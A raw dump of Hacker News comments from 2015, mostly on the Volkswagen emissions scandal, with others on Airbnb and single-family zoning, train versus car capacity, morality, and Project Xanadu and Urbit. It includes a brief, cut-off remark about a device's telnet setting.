Care to cite examples of such &quot;common industry practice&quot;?<p>> Third, Volkswagen is a group<p>That won&#x27;t make them less open to litigation.<p>> Fourth, it is common that such investigations go on for years without end.<p>Yes, investigation and litigation will take years, but effects will be felt suddenly, such as VW cars not being able to get re-registered and driven on roads since they don&#x27;t comply with emission standards, causing economic hardship and potentially larger lawsuits against VW. I think juries will be rather sympathetic to a few testimonies to that effect.",1443365974

A house on the block goes on the market.<p>Several families, with children around the same as the neighbors, tour and bid on the property.  However, an enterprising person (who doesn&#x27;t need the bedrooms for kids) uses the anticipated income from airbnb rentals (not to mention the absence of childcare costs) to outbid all those families.  The SFR zoned house, on a SFR zoned block, is now a hotel, for all practical purposes.  Guess the kids will have to find neighborhood friends somewhere else.<p>The visitors are quiet, polite.  So, no harm no foul?<p>I understand that this scenario can occur in the absence of airbnb or even short term rentals(plenty of people rent out rooms in their houses), but there&#x27;s an order of magnitude difference here.  Also, I still see more benefit to this if these are permanent, long term rentals.  They may be students who need a place to live, long term residents who need a place to live.  I also think that <i>unregulated and unresticted</i>[1] airbnb makes this scenario much more likely (which is one reason why the company is so profitable, it has made it much easier to rent out &quot;spare&quot; bedrooms, creating a new market).<p>[1] properly regulated airbnb, which allows someone to rent out their house while they are on vacation, now and then, would not cause any of this harm.",1443365968

I haven&#x27;t been able to crack the password though yet so I&#x27;m guessing it&#x27;s somewhat secure. The good news is that you can only enable telnet via the config file backup/restore system (and it&#x27;s disabled by default):<p><pre><code>  [telnetd]

10286696,comment,10278339,10282429,0,0,Zach_the_Lizard,,,"It comes down to space. Cars occupy way more space per passenger than trains do. A fully loaded subway train can easily carry almost thousand people. The 7000 series in the DC Metro carries ~175 people per car maximum, and the trains are 8 cars long, for 1400 people per train. Normally, 26 trains per hour are scheduled during rush hour, allowing up to 36,000 people per hour if all trains were 8 cars long (they currently aren&#x27;t due to power constraints). Other systems that have longer trains, better headways, and better seat configurations have way higher capacities. New York for instance could achieve much greater capacity given its longer trains and a modern signalling system.<p>By contrast, a road lane (which uses the same space) currently typically carries around 1000-2000 cars per hour. In ideal circumstances it can be almost 5000 cars per hour. Even assuming quadruple capacity from self driving cars (not realistic), 20,000 cars per hour in ideal circumstances would compete with trains at a far higher environmental cost.<p>But in more realistic scenarios with quadruple capacity, 4000-8000 cars per hour would fall way short of a train. Given that we have to account for pedestrians, cyclists, etc., I can easily see traffic lights continuing to exist, making self driving cars not achieve the miracles people expect.",1443365714

They are facts about the world not moral judgments.<p>> If everyone decided to start “gaming” social interactions, i&#x27;m not sure we&#x27;d be left with a society i would want to live in...<p>Probably not but it would at least have the virtue of honesty. Your preferences are a fact about you, not deep statements about reality. The universe does not care and your descendants 200 years hence will be as different from you as you are from your ancestors in 1815. If we&#x27;re around that long, we&#x27;ll all be monsters to some. Morality is mostly, perhaps entirely fashion and economics.<p>> Part of the social contract, i think, involves not emphasising what chumps everyone is for following it.

The rest is also interested by performance, look, ...<p>Pollution is only important because tax level of the car is directly related to the emission of the car. IMO that is highly unlikely that government will take action against car owner like retroactive taxation, so as far as customers are concerned, nothing has changed.<p>As an illustration, I remember as a kid when VW turbo diesel became really performant. Since Diesel is much cheaper, diesel car became really popular. People were claiming that they did it for the environment as at the time, diesel was thought to be cleaner. A decade or more later, diesel was recognised as being more polluting but that did not change at all the diesel use in the country at all. ( Let&#x27;s be realistic for a moment - Prius type car are popular but they would have stormed the market if pollution was a top concern for people. Instead, we got SUV taking the European market by storm - SUV !!! )<p>So yeah that will be rough time for VW, but the analysis in the document does not seem realistic at all.",1443363509

Let&#x27;s do some math. VW has a $50B cap now. No one is going to buy VW cars for a while, so the bleeding will continue. 
With 11 million cars affected and an average price of $20-30k, even a $5k reimbursement or fine or fixes per car that&#x27;s involved, that&#x27;s $55B that&#x27;s gone up in smoke. 
Do you think that I, as a VW owner, will be able to get a good car resale value, even after a fix that will likely leave my car less powerful or get worse fuel economy? Those are your only two options.
The amount of willful deception and fraud that needed to take place at all levels of this company&#x27;s management will make a great study for what not to do for decades to come.

Project Xanadu took a &quot;whole cow&quot; approach to building a network centered around publishing documents and linking between them. The stated goals for Urbit and Xanadu seem to overlap [1] enough that Xanadu would be easier to implement on top of Urbit than on top of anything else. It could then be Urbit&#x27;s superior alternative to the World Wide Web for publishing hypertext documents. Last year I emailed Nelson asking whether he  knew about Urbit (secretly hoping he might already be working with or for you) but he replied he didn&#x27;t.<p>[1] <a href=""https://en.wikipedia.org/wiki/Project_Xanadu#Original_17_rules"" rel=""nofollow"">https://en.wikipedia.org/wiki/Project_Xanadu#Original_17_rul...</a>",1443362587

I have mixed feelings at present, but the author&#x27;s feelings don&#x27;t seem to be well thought out:<p>> As someone who just recently bought at VW diesel - my first VW ever, and almost certainly my last - I can of course only speak for myself. But everyone I&#x27;ve talked to feels pretty much exactly as I do. And if after some more independent analysis, the numbers come back and they are even close to what we currently read in the press (10-40x more pollutants than advertised), I will sell the car immediately even if it is at an almost total loss.<p>I agree not to reward Volkswagen&#x27;s fraudulent behavior, but if everyone is made whole as a result of this saga I am not sure that I have an issue with Volkswagen moving forward.  I certainly would not sell my car. The only actions that make sense through the author&#x27;s lens of wanting to be environmentally conscious would be to fix the emissions or crush it.  Selling it appears to just move the problem to someone else.<p>>There is one, and only one reason why I would consider buying a VW in the future: massively beat Tesla at their game. Abandon all fuel-powered development today and invest every single cent into long-range electric cars, and build the electric charging infrastructure throughout Europe and the US (and the rest of the world). In addition, the development of the self-driving car has to be your top priority. The car of the future has no human driver in it, and of course you know this (anyone at VW who doesn&#x27;t, let go of them immediately).<p>The author believes that an entity engaged in a scandal for shady software cheats should engage in making software that once again has the ability to impact people other than their owners in order to make amends for their current software cheat?<p>I can&#x27;t say as I agree.  I believe the amends that they need to make are:
1) fix the emissions issues in all current and future cars,
2) make the environment whole to the fullest extent possible.  I&#x27;m not sure what options are available for this, but fines and funding third party research would fit the bill if nothing else,
3) make the owners of the cars whole: If the emissions fix alters the car&#x27;s attributes negatively I want to be compensated for the delta from the car I actually bought.<p>>  The new CEO, Matthias Müller from Porsche, thinks autonomous vehicles are an unjustifiable hype. I wish I was kidding, but I&#x27;m not: the VW board thought that the best person to replace the guy who oversaw the cheating software scandal (or was unaware of it) is a guy who seems to have even less appreciation of the ongoing software revolution.<p>Finally at the end of the article we get to some actual meat!! That is unfortunate, and would be worth putting at the top of the article and expanding on.",1443362582
